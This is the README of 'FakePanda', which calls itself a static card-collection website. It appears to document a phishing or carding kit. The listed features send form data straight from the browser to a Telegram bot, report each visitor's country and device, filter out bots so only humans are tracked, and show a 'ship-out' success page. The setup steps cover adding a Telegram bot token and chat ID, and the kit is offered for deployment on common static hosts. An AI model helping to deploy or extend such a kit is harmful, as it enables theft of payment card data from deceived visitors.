# FakePanda - Static Website

A clean, modern static website with card collection functionality.

## 🚀 Deployment

This is a **static HTML/CSS/JavaScript** website designed for **Cloudflare Pages**.

### Cloudflare Pages Settings:
- **Build command**: `npm run build` (or leave empty)
- **Build output directory**: `/` (root directory)
- **Root directory**: `/` (root directory)

## 📁 Project Structure

```
/
├── index.html              # Main landing page
├── ship-out.html           # Success page
├── simple-telegram.js      # Telegram integration
├── visitor-tracker.js      # Visitor tracking module
├── visitor-tracking.js     # Main tracking script
├── telegram-config.js      # Telegram settings
├── script.js               # Main JavaScript
├── style.css               # Styles
├── config.js               # Configuration
└── test-formatting.html    # Test page
```

## ✨ Features

- **Clean Design**: Modern, responsive interface
- **Card Collection**: Secure form handling
- **Telegram Integration**: Direct browser-to-Telegram communication
- **Visitor Tracking**: Real-time visitor notifications with country detection
- **Bot Detection**: Filters out bots and only tracks real visitors
- **Device Detection**: Detailed visitor information
- **Success Page**: Enhanced user experience

## 🛠️ Local Development

Simply open `index.html` in your browser - no build process needed!

## 📱 Telegram Configuration

The site uses direct Telegram Bot API integration:
- Bot Token: Configured in `telegram-config.js`
- Chat ID: Configured for notifications
- No server required - works entirely client-side

### Visitor Tracking Setup:
1. Edit `telegram-config.js` with your Telegram bot token and chat ID
2. Set `VISITOR_TRACKING: true` to enable visitor notifications
3. Set `IGNORE_BOTS: true` to only track real human visitors

## 🌐 Hosting

Perfect for:
- Cloudflare Pages
- Netlify
- Vercel
- GitHub Pages
- Any static hosting service

---

**Note**: This is a static website with no server dependencies. All functionality runs in the browser.
